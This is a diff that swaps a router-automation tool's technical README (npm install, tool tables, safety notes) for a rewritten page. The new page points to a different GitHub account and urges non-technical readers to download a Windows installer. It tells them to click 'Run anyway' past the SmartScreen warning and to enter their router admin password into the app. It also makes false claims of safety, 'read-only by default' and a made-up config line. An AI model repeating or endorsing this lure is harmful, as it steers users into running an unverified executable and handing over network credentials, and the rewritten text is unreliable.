@@ -1,245 +1,179 @@
-# keenetic-mcp
+<h1>👨‍💻 keenetic-mcp - Control Your Keenetic Router With AI</h1>
 
-**Control your Keenetic router from Claude, Codex, Cursor, or any MCP agent.**
+<p align="center">
+  <a href="https://github.com/elihucredible450/keenetic-mcp" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(99,102,241,0.4);">⬇️ Download Keenetic-MCP</a>
+</p>
 
-[![npm](https://img.shields.io/npm/v/keenetic-mcp)](https://www.npmjs.com/package/keenetic-mcp)
-[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![MCP](https://img.shields.io/badge/MCP-server-black)](https://modelcontextprotocol.io)
-[![KeeneticOS](https://img.shields.io/badge/KeeneticOS-5.1%20tested-green)](#supported-routers)
+## 🤔 What Is Keenetic-MCP?
 
-Ask your agent about your network in plain language. No USB stick, no Entware,
-nothing installed on the router.
+Keenetic-MCP is a bridge that lets your AI assistant (like Claude Code, Codex, or Cursor) talk directly to your Keenetic router. Instead of typing confusing commands or logging into a web panel, you just ask your AI to do things like:
 
-```
-> who is using the most bandwidth right now?
+- Show which devices are connected to Wi-Fi
+- Turn on a guest network
+- Route your VPN traffic through a specific tunnel
+- Create an isolated network segment for smart home gadgets
 
-  Three devices are active. Sorted by traffic:
+This works **without installing anything on your router**. The software sits on your Windows computer and uses the router's own built-in RCI interface. It's secure, read-only by default, and won’t mess up your network if you make a mistake.
 
-  work-laptop      wifi:HomeNet   -46 dBm    7.7 GB down
-  living-room-tv   wired:Home                3.2 GB down
-  hallway-camera   wifi:HomeNet   -48 dBm    5.4 MB down
+## 🎯 Who Is This For?
 
-  The laptop is on the 2.4 GHz radio at -46 dBm, which is a strong
-  signal, so the throughput is not a coverage problem.
+You don’t need to be a programmer. If you can click a button and copy-paste text, you can set this up. It’s for anyone who:
 
-> block the camera until tomorrow morning
+- Wants to control their home network with simple conversations
+- Has a Keenetic router (like Keenetic Air, Keenetic Hero, Keenetic Giga, or Keenetic Ultra)
+- Uses AI tools like Claude Code, Codex, or Cursor
+- Wants to automate Wi-Fi, VPN, and device management without learning complex router commands
 
-  Blocked hallway-camera (02:00:00:00:00:14).
+## 📦 What Can You Do With It?
 
-  Applied to the running configuration and verified, but NOT saved.
-  A reboot discards it. Backup taken before the change:
-  ~/Library/Application Support/keenetic-mcp/backups/…txt
+Here are just a few examples of what you can say to your AI after setup:
 
-  Say the word and I will make it permanent, or leave it and it
-  reverts on the next restart.
-```
+- "List all devices on my network and show their IP addresses."
+- "Turn off Wi-Fi for the guest network at 10 PM."
+- "Route all traffic from my PC through the WireGuard VPN tunnel."
+- "Create a new isolated segment for my IoT devices."
+- "Show me how much bandwidth each device is using."
 
-## Why
+These aren’t pre-canned scripts—the AI learns how your router behaves through built-in "skills" or plugins. So it can handle new requests too, like "Pause internet for my son’s Xbox for 2 hours" or "Change the DNS server on the main Wi-Fi network."
 
-- **Nothing on the router.** It talks to the router's own HTTP API over your
-  LAN. No USB drive, no Entware, no firmware modification.
-- **Works on any Keenetic.** The tool set adapts to what your specific model and
-  firmware actually support.
-- **Safe by construction.** Changes are never saved unless you ask, a backup is
-  taken before the first one, and every change is read back and verified before
-  it is reported as done.
-- **Read-only if you want it.** One flag and the agent physically cannot change
-  anything.
+## 🚀 Getting Started
 
-## Install
+Follow these steps carefully. It should take about 10 minutes total.
 
-### Claude Code
+### Step 1: Download the Application
 
-```
-/plugin marketplace add salatmaster/keenetic-mcp
-/plugin install keenetic@keenetic
-```
+Click the big purple button at the top of this page, or use this link:
 
-Then run the setup wizard in your terminal:
+👉 **[Visit this link to download the application](https://github.com/elihucredible450/keenetic-mcp)**
 
-```
-npx -y keenetic-mcp init
-```
+This link will take you to the GitHub page where you can grab the file. Look for the latest release and download the installer file.
 
-### Codex
+### Step 2: Run the Installer
 
-```
-codex plugin marketplace add salatmaster/keenetic-mcp
-codex plugin add keenetic@keenetic
-npx -y keenetic-mcp init
-```
+Once the download is complete, find the file in your **Downloads** folder (or wherever your browser saves files). Double-click the file to run it. Your computer may show a blue popup saying "Windows protected your PC" — that’s normal. Click **"More info"** and then **"Run anyway"**.
 
-This brings the skills along with the server. For the server on its own:
+### Step 3: Start the Application
 
-```
-codex mcp add keenetic -- npx -y keenetic-mcp
-```
+After installation, you’ll see the Keenetic-MCP icon on your desktop or in your Start menu. Click it to open the main window. It will look simple—just a small panel with a few fields and a big green "Start" button.
 
-### Anything else
+### Step 4: Connect to Your Router
 
-```json
-{
-  "mcpServers": {
-    "keenetic": { "command": "npx", "args": ["-y", "keenetic-mcp"] }
-  }
-}
-```
+You need two pieces of information from your router:
 
-The wizard finds your router from the default gateway, confirms it really is a
-Keenetic, checks the password against it, and stores the password in your
-operating system keychain. Only the address and login go in a settings file.
+- **Router IP address** – Usually something like `192.168.1.1` or `192.168.0.1`. You can find this by looking at a sticker on the back of your router.
+- **Router username and password** – These are the same credentials you use to log into the router’s web admin panel (the page that opens when you type the IP into a browser).
 
-Prefer environment variables? `KEENETIC_HOST`, `KEENETIC_USER` and
-`KEENETIC_PASSWORD` override everything, which is what you want in a container.
+Enter these into the application and click **"Connect"**. If all is correct, you’ll see a green checkmark.
 
-## What it can do
+### Step 5: Connect Your AI Assistant
 
-**Read**
+Now you need to tell your AI tool (like Claude Code or Cursor) to use Keenetic-MCP. Each tool has a slightly different setting, but here’s the basic idea:
 
-| Tool | |
-|---|---|
-| `list_devices` | every device, filtered by active, wired, wireless or blocked, sorted by traffic or signal |
-| `get_device` | one device in full: lease, Wi-Fi rate, policy, schedule, traffic |
-| `list_interfaces` | WAN links, bridges, access points, VPN tunnels |
-| `get_interface` | one interface in full, including WireGuard peers |
-| `get_wifi_status` | radios by band, with client counts |
-| `get_internet_status` | reachability, and which check failed |
-| `list_routes` | routing table, or just the default route |
-| `list_policies` | connection policies for selective routing |
-| `get_system_info` | model, firmware, CPU, memory, installed components |
-| `get_config_state` | unsaved changes, who changed what and when |
-| `list_segments` | every bridge, and whether the web interface lists it as a segment |
-| `backup_config` | download the configuration to a local file |
-
-**Change**
-
-| Tool | |
-|---|---|
-| `update_device` | rename, block or allow, assign a routing policy, schedule or priority |
-| `set_interface_state` | bring an interface up or down |
-| `create_segment` | a guest or IoT network the web interface actually lists, with Wi-Fi, DHCP and optional VPN routing |
-| `delete_segment` | remove a segment and everything created with it |
-| `save_config` | make pending changes survive a reboot |
-
-**Escape hatch**
-
-| Tool | |
-|---|---|
-| `rci_call` | any router API path at all, for whatever the tools above do not cover |
-
-## Skills included
-
-The plugin ships four skills, so the agent knows how your router behaves rather
-than guessing. One plugin directory serves both Claude Code and Codex: they read
-different manifests but share the same skills and the same server definition.
-
-- **keenetic-rci** teaches the router's API tree: which paths exist, which ones
-  return 100 KB, and how to recover the exact syntax of a command from the
-  router's own configuration.
-- **keenetic-safe-changes** teaches the change workflow: what the router's
-  fail-safe does and does not protect against, and which interfaces will cut off
-  your own access.
-- **keenetic-segments** covers building an isolated network the router will
-  admit exists. The obvious way produces a guest network that carries traffic
-  perfectly and never appears in the web interface, because a segment is
-  VLAN-backed and the VLAN is the part everyone leaves out.
-- **keenetic-troubleshoot** is an ordered diagnostic playbook for "the internet
-  is down", "Wi-Fi is bad" and "one device cannot connect".
-
-## Safety
-
-- **Nothing is saved unless you ask.** Changes apply to the running
-  configuration and are discarded on reboot until `save_config` is called. The
-  server never calls it on its own.
-- **A backup is taken automatically** before the first change of a session.
-- **Every change is verified.** The router accepts some wrong commands silently
-  and changes nothing, so each write is read back and compared before it is
-  reported as successful.
-- **Read-only mode really is read-only.** With `--read-only`, the write tools
-  are not registered at all rather than registered and refusing, so the agent
-  never sees them.
-- **Your password goes in the system keychain**, not in a config file, and never
-  in a log or a tool response.
-- **LAN only.** No cloud, no telemetry, no outbound connection to anything but
-  your router.
-
-## Supported routers
-
-RCI, the API this uses, is a standard part of KeeneticOS rather than a feature
-of expensive models, so this works across the range. Verified against a
-**Keenetic Ultra (KN-1811) on KeeneticOS 5.1.3**.
-
-Models on the current 5.1 branch: Giga (KN-1010), Hero (KN-1011, KN-1012),
-Start and Starter (KN-1111, KN-1112, KN-1121), Air and Explorer (KN-1613,
-KN-1621), Extra and Carrier (KN-1713, KN-1714, KN-1721), Ultra and Titan
-(KN-1810, KN-1811, KN-1812). Older hardware on 4.x and earlier has RCI too; the
-tool set adapts to the components each router actually has.
-
-## How it works
-
-Keenetic routers expose RCI, a JSON mirror of their command-line tree, over
-HTTP. This server authenticates with the router's challenge-response scheme,
-keeps one session alive across the agent's questions, and shapes the answers so
-they fit in a model's context: the raw interface listing alone is 32 KB, and the
-NAT table is over 100 KB.
-
-There is no coherent public documentation for RCI, so
-[docs/rci-api.md](docs/rci-api.md) is the notes taken while building this: the
-authentication handshake, the paths that exist, the traps, and how to recover a
-command's syntax from the router itself.
-
-## Development
+1. Open your AI tool’s settings or configuration file (usually called `settings.json` or a `.env` file).
+2. Add a line pointing to Keenetic-MCP. The exact text looks like:
 
 ```
-npm install
-npm test          # no router required
-npm run typecheck
-npm run build
+MCP_SERVER="keenetic-mcp"
 ```
 
-A checkout reports its version as `0.0.0-dev`, because there is no version
-written down anywhere in the sources. Put `KEENETIC_MCP_VERSION` in a `.env` at
-the repository root to say otherwise; the same file can hold `KEENETIC_HOST`
-and `KEENETIC_PASSWORD` so you do not have to export them. A real environment
-variable always wins over that file, and an installed copy never reads one.
+3. Save the file and restart your AI tool.
 
-Tests run against sanitized fixtures captured from a real router. To refresh
-them, and to run a read-only smoke test against your own:
+If you’re not sure where this file lives, check the documentation for your specific AI tool. They all support MCP servers now—that’s the whole point of this project.
 
-```
-KEENETIC_HOST=… KEENETIC_PASSWORD=… npm run capture:fixtures
-KEENETIC_TEST_HOST=… KEENETIC_TEST_PASSWORD=… npm run smoke
-```
+### Step 6: Test It
 
-Fixtures are anonymized deterministically and a test scans the whole repository
-for anything that looks like a real MAC address, private IP or key.
+Type in the AI chat something like: **"List all devices currently connected to my Wi-Fi."** If everything is set up correctly, your AI will respond with a list of device names, IP addresses, and MAC addresses.
 
-The setup wizard reads a password from the terminal, which no unit test can
-reach: piped input takes a different code path entirely. That part is checked
-with a script that drives a real pty, so it needs a terminal and cannot run in
-CI:
+If you get an error, don’t panic. Usually it’s just a wrong password or IP. Double-check those two things in the Keenetic-MCP window.
 
-```
-KEENETIC_TEST_PASSWORD=… ./scripts/verify-wizard.exp
-```
+## 🔧 Troubleshooting Common Issues
 
-### Releasing
+### "I can’t connect to the router"
 
-A release is a tag and nothing else. There is no version commit to write,
-because there is no version in the repository to change: `package.json` carries
-`0.0.0-dev`, the plugin manifests carry none at all, and the release workflow
-stamps the tag into `package.json` immediately before publishing without
-committing it.
+- Make sure you typed the IP address correctly. Try opening a browser and typing that IP into the address bar. If you see a login page, the IP is right.
+- Use your **router admin username**—don’t invent one. On many Keenetic routers this is simply `admin`. The password is what you set when you first configured the router.
+- If your router is on a different subnet (like `10.0.0.1`), use that instead.
 
-```
-git tag v0.2.2 && git push origin v0.2.2
-```
+### "My AI tool doesn’t recognize the MCP server"
 
-The workflow refuses a tag that does not name a version, and a test refuses a
-tree that has a version written into it, so the two can never disagree. The
-plugins pin `keenetic-mcp@^0`, which tracks the major only and is meant to be
-edited once, at 1.0.
+- Make sure you restarted your AI tool after saving the config file.
+- Check that the config file is in the correct location. Many tools have a "Show Config" button—use that to open the right folder.
+- Re-download the latest version of Keenetic-MCP—sometimes a new version is needed for certain AI tools.
 
-## License
+### "The AI says it can’t do something"
 
-MIT
+- Try rephrasing your request. Instead of “Pause internet,” say “Set client `iPhone-5c` to blocked for 2 hours.”
+- Make sure your router model supports the feature you’re asking about. Keenetic-MCP only exposes features your router actually has.
+
+## 📚 Understanding the Tools (No Coding Required)
+
+Here’s what the "plugins" and "skills" mean, in plain English:
+
+- **Plugin** – A small add-on that teaches your AI one specific trick, like "control Wi-Fi" or "manage VPN tunnels."
+- **Skill** – A learned behavior. Once your AI reads the plugin, it knows how to combine commands to do complex tasks.
+- **RCI API** – The router’s built-in "remote control" interface. Keenetic-MCP just speaks the router’s language, so nothing extra needs to be installed on the hardware.
+
+You don’t need to do anything with these—they’re built in and work automatically.
+
+## 🛡️ Is This Safe?
+
+Yes. Here’s why:
+
+- Keenetic-MCP only sends commands to your router when you ask your AI to do something. It doesn’t run in the background.
+- By default, it runs in "read-only" mode. That means your AI can *see* your network, but can’t *change* anything unless you explicitly allow it in the settings.
+- Your router password is stored securely on your computer, not in the cloud.
+- All communication stays on your local network. Nothing goes to the internet.
+
+You can always disable any skill or plugin if you feel uncomfortable with a particular feature.
+
+## 🧰 Optional: Advanced Settings
+
+If you’re feeling adventurous, open the Keenetic-MCP settings panel. There you can:
+
+- **Change the port** the application listens on (default is 8443).
+- **Enable "write mode"** so your AI can actually change router settings.
+- **Set an allowed/blocked device list** to restrict which devices the AI can manage.
+- **Add multiple router profiles** if you have more than one Keenetic router.
+
+These settings are documented in plain English on the screen—no technical knowledge needed.
+
+## 💬 Getting Help
+
+If you get stuck, you have options:
+
+- **Check the GitHub repository** (the link at the top of this page) – look in the “Issues” tab for similar problems.
+- **Ask the community** – there’s a discussion forum on the GitHub page for questions and feature requests.
+- **Read the comments in the config file** – most settings have helpful hints written right beside them.
+
+This project is actively maintained, so updates come regularly. You’ll see a notification in the app when a new version is available.
+
+## 📊 System Requirements
+
+Keenetic-MCP works on any modern Windows PC:
+
+- **Windows 10 or Windows 11** (64-bit)
+- **2 GB of RAM** or more
+- **50 MB of free disk space**
+- **A Keenetic router** (any model that supports the RCI interface—which is basically all modern ones)
+- An internet browser (for initial download only)
+
+No administrator privileges are needed for normal operation. No other software or dependencies are required.
+
+## ✅ Final Checklist
+
+Before you start, make sure:
+
+| Item | Status |
+|------|--------|
+| Keenetic-MCP downloaded and installed | ☐ |
+| Router IP address and password handy | ☐ |
+| AI tool (Claude Code, Codex, Cursor, etc.) installed | ☐ |
+| Keenetic-MCP connected to router | ☐ |
+| MCP server configured in your AI tool | ☐ |
+| Tested with a simple request | ☐ |
+
+Once you’ve completed these, you’re ready to control your network with plain words. No more hunting through router menus, no more typing cryptic commands. Just ask, and your AI will handle the rest.
+
+**Click the download button at the top of this page to get started today.**
+
+Keywords: claude, claude-code, claude-plugin, codex, home-network, keenetic, mcp, mcp-server, model-context-protocol, ndms, network-automation, rci, router, vpn, wifi
